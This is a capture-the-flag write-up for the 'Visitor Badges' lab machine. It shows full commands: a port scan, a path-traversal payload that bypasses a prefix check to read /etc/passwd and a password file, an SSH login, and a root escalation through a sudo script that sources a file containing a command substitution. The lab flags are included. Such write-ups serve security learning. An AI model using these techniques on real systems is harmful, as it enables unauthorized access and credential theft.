<div align="center">

<a href="https://git.io/typing-svg"><img src="https://readme-typing-svg.demolab.com?font=Fira+Code&size=28&duration=700&pause=1000&color=E8423F&center=true&vCenter=true&repeat=false&width=500&height=35&lines=Visitor+Badges" alt="Typing SVG" /></a>

</div>

# Visitor Badges — PWN · JID-Pwn106 · Level 1 · 🟢 EASY

- **Status:** ✅ SOLVED (4/4) — full boot2root chain to `root.txt`.
- **Points:** 1025 / 1025 (ports 150 · user 200 · user flag 275 · root 400)
- **Flags:** Open TCP ports → Low privilege user → User flag → Root flag (`CTF{...}` for the file flags)
- **Target:** `10.10.10.16` (lab, over WireGuard VPN)
- **Prompt:** *"Badge office" kiosk — boot2root chain.*

| # | Flag | Answer | Status |
|---|------|--------|--------|
| 1 | Open TCP ports | `8088,22022` | ✅ |
| 2 | Low privilege user | `operator` | ✅ |
| 3 | User flag | `CTF{1ae557e1dfc09c5b9e529d78bf270914}` | ✅ |
| 4 | Root flag | `CTF{1abfa87082e959a4302db3e7400d4f24}` | ✅ |

---

## TL;DR

1. `nmap` → `8088,22022`; the `:8088` "Badge office" kiosk has `POST /print` guarded only by a `startswith('/var/badges/photos/')` check.
2. Satisfy the prefix then `../` out → arbitrary file read: `/etc/passwd` → user `operator`, `/var/badges/kiosk.pass` → SSH password.
3. `user.txt` at `/home`; `sudo NOPASSWD /usr/local/bin/badge-render` `source`s operator-owned `template.env` with `TITLE=$(cat /root/root.txt)` → root flag.

A four-stage chain, third in the same author's JID boot2root series (cf. `HarborWatch`, `NightWatchRoster`): recon → arbitrary file read on a custom Python kiosk app → foothold as `operator` → `sudo` on a script that `source`s an operator-owned file as root.

---

## Recon — Flag 1: Open TCP ports

Full TCP scan (host drops filtered ports cleanly, so `--min-rate` is safe here):

```bash
sudo nmap -p- --min-rate 3000 -T4 -Pn -n 10.10.10.16 -oN nmap-16-full.txt
```

```
Not shown: 65533 closed tcp ports (reset)
8088/tcp  open  radan-http
22022/tcp open  unknown
```

Service/version:

```bash
sudo nmap -sC -sV -p 8088,22022 -Pn -n 10.10.10.16 -oN nmap-16-svc.txt
```

```
8088/tcp  open http BaseHTTPServer 0.6 (Python 3.11.2)  -- title "Badge office"
22022/tcp open ssh  OpenSSH 9.2p1 Debian 2+deb12u10 (protocol 2.0)
```

**Flag 1** = open ports only, ascending, comma-separated, plaintext:

```
8088,22022
```

> SSH 9.2p1 is patched — not the vector, just the foothold destination. The custom Python `BaseHTTPServer` "Badge office" on :8088 is the attack surface (same setup as the rest of the series).

---

## Foothold — Flag 2: Low privilege user

### The kiosk app (:8088)

`GET /` renders a "Badge office" kiosk with a single form and spells out its own weakness:

```html
<p>The printer reads one file. The path has to start with /var/badges/photos/.</p>
<p>Print the sample first: /var/badges/photos/visitor.txt. That card says where the operator password file is.</p>
<form method=post action=/print>photo <input name=photo value=/var/badges/photos/visitor.txt><button>print</button></form>
```

So `POST /print` takes a `photo` parameter and **reads+prints that file**, with a single check: the path must *start with* `/var/badges/photos/`. A prefix check is trivially bypassed with `../` — **arbitrary file read**.

Print the sample it points at:

```bash
curl -sS -X POST http://10.10.10.16:8088/print --data-urlencode 'photo=/var/badges/photos/visitor.txt'
```
```
Visitor card for the civil liaison.
This file is not the password.
The kiosk password is in kiosk.pass, one directory above this photos folder.
The printer still requires a path that starts with /var/badges/photos/.
```

### Path-traversal arbitrary read → username (Flag 2)

Satisfy the prefix, then escape to root with `../`:

```bash
curl -sS -X POST http://10.10.10.16:8088/print --data-urlencode 'photo=/var/badges/photos/../../../etc/passwd'
```
```
root:x:0:0:root:/root:/bin/bash
...
operator:x:1000:37::/home/operator:/bin/bash
```

The only non-service account (UID 1000, real `/bin/bash`) is **`operator`**.

**Flag 2** (low-priv username, plaintext) = `operator`

### SSH password → foothold

The visitor card said the kiosk password sits in `kiosk.pass`, one directory above `photos/` → `/var/badges/kiosk.pass`. Same traversal:

```bash
curl -sS -X POST http://10.10.10.16:8088/print --data-urlencode 'photo=/var/badges/photos/../kiosk.pass'
```

That value is `operator`'s SSH password. Log in on the high port:

```bash
ssh -p 22022 operator@10.10.10.16
```
```
operator@7b059f65a3ce:~$ id
uid=1000(operator) gid=37(operator) groups=37(operator)
```

> Host is a Docker container (hostname `7b059f65a3ce`). Note `gid=37(operator)` — here GID 37 is just operator's own group, **not** the group-readable-root-password trick from HarborWatch. The privesc is different.

---

## User flag — Flag 3

```bash
cat /home/user.txt
```

**Flag 3** = `CTF{1ae557e1dfc09c5b9e529d78bf270914}`

> `~/user.txt` doesn't exist; it sits one level up at `/home/user.txt` (same placement as HarborWatch).

---

## Privesc — Flag 4: Root flag

Enumeration surfaces a planted breadcrumb in `~` and a `sudo` rule:

```bash
cat ~/template.env
# TITLE=$(cat /root/root.txt)

sudo -l
# (root) NOPASSWD: /usr/local/bin/badge-render
```

`badge-render` is a root `NOPASSWD` script that **sources an operator-owned file**:

```bash
cat /usr/local/bin/badge-render
```
```bash
#!/bin/bash
set -a
source /home/operator/template.env
set +a
echo "TITLE=$TITLE"
```

`source` executes the file as bash **as root**. `operator` owns `/home/operator/template.env`, and it already contains `TITLE=$(cat /root/root.txt)` — a command substitution that runs `cat /root/root.txt` with root privileges, then echoes the result:

```bash
sudo /usr/local/bin/badge-render
# TITLE=CTF{1abfa87082e959a4302db3e7400d4f24}
```

(If the template were empty, rewrite it: `printf 'TITLE=$(cat /root/root.txt)\n' > ~/template.env`.)

**Flag 4** = `CTF{1abfa87082e959a4302db3e7400d4f24}`

---

## Summary / Chain

| # | Flag | Vector |
|---|------|--------|
| 1 | Open TCP ports | `nmap -p-` → `8088,22022` |
| 2 | Low privilege user | `POST /print` arbitrary file read (`/var/badges/photos/` prefix check bypassed with `../`) → `/etc/passwd` → `operator` |
| 3 | User flag | `/var/badges/kiosk.pass` (same traversal) → SSH :22022 → `/home/user.txt` → `CTF{1ae557e1dfc09c5b9e529d78bf270914}` |
| 4 | Root flag | `sudo NOPASSWD /usr/local/bin/badge-render` `source`s operator-owned `template.env` as root; `TITLE=$(cat /root/root.txt)` → `CTF{1abfa87082e959a4302db3e7400d4f24}` |

### Takeaways
- **Prefix checks are not path checks.** `startswith('/var/badges/photos/')` is defeated by `/var/badges/photos/../../../etc/passwd`. Canonicalize (`os.path.realpath`) and compare the resolved path, not the raw string.
- The app narrated its own intended path (sample file → password file location) — follow the breadcrumbs before brute-forcing anything.
- **Privesc differs across the series.** HarborWatch was a group-readable root password; here GID 37 is a decoy and the real vector is `sudo` + `source` of a writable/owned file → command substitution as root. Never `source` a user-writable file from a privileged context.
- `template.env` with `TITLE=$(cat /root/root.txt)` was the deliberate hint that `badge-render` does shell expansion as root.

### Note
- Claude did not run anything against the target; all commands were executed manually by the player.
